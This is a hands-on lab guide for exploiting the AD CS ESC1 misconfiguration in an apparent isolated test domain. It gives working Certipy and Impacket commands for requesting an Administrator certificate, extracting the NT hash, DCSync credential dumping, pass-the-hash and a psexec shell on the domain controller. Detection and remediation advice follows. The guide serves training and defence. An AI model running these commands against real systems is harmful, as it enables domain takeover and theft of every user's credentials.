# Scenario 1: ESC1 Attack Execution Guide

## 🎯 Attack Overview

**Goal:** Escalate from low-privileged user (jdoe) to Domain Admin using ESC1 vulnerability

**Attack Chain:**
```
jdoe (Domain User) → Request Certificate as Administrator → Authenticate with Certificate → Domain Admin
```

---

## 📋 Prerequisites Checklist

Before starting the attack, ensure:

- [ ] All required VMs are running (DC, CA, Attacker). Win10 is optional for validating ESC1.
- [ ] Domain `serini.lab` is created
- [ ] AD-CS is installed on CA server
- [ ] Vulnerable template created (run Ansible playbook `playbooks/08-esc1-template.yml`)
- [ ] Test user created (run Ansible playbook `playbooks/09-test-user.yml`)
- [ ] Certipy installed on Kali (run Ansible playbook `playbooks/06-kali-tools.yml`)

---

## 🚀 Attack Execution Steps

### **Step 1: Enumerate Certificate Templates**

**On Kali (192.168.56.50):**

```bash
# If certipy was installed with pipx, ensure it's in PATH:
export PATH="$HOME/.local/bin:$PATH"

# CRITICAL: Ensure time is synced with DC (Kerberos Requirement)
sudo ntpdate 192.168.56.10

# Find all certificate templates and check for ESC1
certipy find -u jdoe@serini.lab -p 'Summer2024!' -dc-ip 192.168.56.10 -vulnerable

# Save output to file
certipy find -u jdoe@serini.lab -p 'Summer2024!' -dc-ip 192.168.56.10 -vulnerable -stdout
```

**Expected Output:**
```
Certificate Authorities
  0
    CA Name                             : SERINI-CA
    DNS Name                            : ca.serini.lab
    Certificate Subject                 : CN=SERINI-CA, DC=serini, DC=lab
    ...
    
Certificate Templates
  0
    Template Name                       : VulnUserAuth
    Display Name                        : Vulnerable User Authentication
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True    <-- ESC1 VULNERABILITY!
    ...
```

**📚 What this does:**
- Connects to the domain as `jdoe`
- Queries the CA for all certificate templates
- Identifies templates vulnerable to ESC1
- You should see `VulnUserAuth` marked as vulnerable

---

### **Step 2: Request Certificate as Administrator**

**On Kali:**

```bash
# Request a certificate with Administrator's UPN in the SAN
certipy req -u jdoe@serini.lab -p 'Summer2024!' \
    -ca SERINI-CA \
    -target ca.serini.lab \
    -template VulnUserAuth \
    -upn administrator@serini.lab

# Alternative: Use DNS name instead of UPN
certipy req -u jdoe@serini.lab -p 'Summer2024!' \
    -ca SERINI-CA \
    -target ca.serini.lab \
    -template VulnUserAuth \
    -dns dc.serini.lab
```

**If DNS resolution fails** for `ca.serini.lab`, add it to `/etc/hosts` or use the CA IP:

```bash
# Add to hosts
sudo sh -c "echo '192.168.56.20 ca.serini.lab' >> /etc/hosts"

certipy req -u jdoe@serini.lab -p 'Summer2024!' \
    -ca SERINI-CA \
    -target ca.serini.lab \
    -template VulnUserAuth \
    -upn administrator@serini.lab \
    -dc-ip 192.168.56.10
```

**Expected Output:**
```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 2
[*] Got certificate with UPN 'administrator@serini.lab'
[*] Certificate object SID is 'S-1-5-21-...-500'
[*] Saved certificate and private key to 'administrator.pfx'
```

**📚 What this does:**
- Uses `jdoe`'s credentials to request a certificate
- Exploits the ESC1 vulnerability to specify `administrator@serini.lab` as the SAN
- The CA issues a certificate that says "this is the Administrator"
- Saves the certificate to `administrator.pfx`

**🔥 This is the exploit!** A low-privileged user just got a certificate for the Domain Admin!

---

### **Step 3: Authenticate Using the Certificate**

**On Kali:**

```bash
# Use the certificate to get a Kerberos TGT for Administrator
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10

# If you used DNS name instead:
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10 -domain serini.lab
```

**Expected Output:**
```
[*] Using principal: administrator@serini.lab
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@serini.lab': aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

**📚 What this does:**
- Authenticates to the DC using the certificate (PKINIT)
- Gets a Kerberos Ticket Granting Ticket (TGT) for Administrator
- Extracts the Administrator's NTLM hash
- Saves the TGT to `administrator.ccache`

**🎉 You now have:**
- Administrator's Kerberos ticket
- Administrator's NTLM hash

---

### **Step 4: Verify Domain Admin Access**

**On Kali:**

```bash
# Option 1: Use the Kerberos ticket
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass serini.lab/administrator@dc.serini.lab

# Option 2: Use the NTLM hash (Pass-the-Hash)
impacket-secretsdump -hashes :NTLM_HASH_HERE administrator@192.168.56.10

# Option 3: Get a shell on the DC
impacket-psexec -hashes :NTLM_HASH_HERE administrator@192.168.56.10

# Option 4: List domain admins
crackmapexec smb 192.168.56.10 -u administrator -H NTLM_HASH_HERE --users
```

**Expected Output (secretsdump):**
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:::
...
```

**📚 What this does:**
- Performs a **DCSync attack** to dump all domain credentials
- This proves you have Domain Admin rights
- You now have hashes for ALL domain users including `krbtgt`

---

## 🎓 Learning Points

### **Why did this work?**

1. **ESC1 Vulnerability:** The certificate template allowed users to specify arbitrary SANs
2. **Client Authentication:** The certificate could be used for Kerberos authentication
3. **No Approval Required:** Domain Users could enroll without admin approval
4. **Trust in Certificates:** AD trusts certificates issued by the Enterprise CA

### **What did we learn?**

- Certificate templates must be carefully configured
- `ENROLLEE_SUPPLIES_SUBJECT` is extremely dangerous
- Low-privileged users can become Domain Admin in minutes
- Certificate-based attacks are stealthy (no password needed)

---

## 🛡️ Detection & Defense

### **How to detect this attack:**

1. **Event ID 4886** - Certificate request (on CA)
2. **Event ID 4887** - Certificate issued (on CA)
3. **Event ID 4768** - Kerberos TGT requested with certificate (on DC)
4. **Look for:** Certificates with mismatched requester and SAN

### **How to prevent this attack:**

1. **Audit certificate templates** - Run Certipy regularly
2. **Remove ENROLLEE_SUPPLIES_SUBJECT** flag from templates
3. **Require manager approval** for sensitive templates
4. **Enable certificate auditing** on the CA
5. **Use Certutil** to review template permissions

### **Fix the vulnerability:**

```powershell
# On CA server - Remove the vulnerable template
certutil -SetCATemplates -VulnUserAuth

# Or fix the template
# Remove the ENROLLEE_SUPPLIES_SUBJECT flag
```

---

## 📊 Attack Timeline

| Step | Time | Privilege Level |
|------|------|----------------|
| Start | 0:00 | Domain User (jdoe) |
| Enumerate templates | 0:01 | Domain User |
| Request certificate | 0:02 | Domain User |
| Authenticate with cert | 0:03 | **Domain Admin** |
| DCSync attack | 0:04 | **Domain Admin** |

**Total time: ~5 minutes** ⚡

---

## 🔗 References

- [Certipy Documentation](https://github.com/ly4k/Certipy)
- [Certified Pre-Owned (ESC1-8)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [AD CS Attack Paths](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)

---

## ✅ Success Criteria

You have successfully completed Scenario 1 if you can:

- [x] Enumerate and identify the ESC1 vulnerability
- [x] Request a certificate as Administrator using jdoe's credentials
- [x] Authenticate to the domain using the certificate
- [x] Perform DCSync to dump all domain credentials
- [x] Explain why the attack worked and how to prevent it

**Congratulations! You've mastered ESC1 exploitation!** 🎉
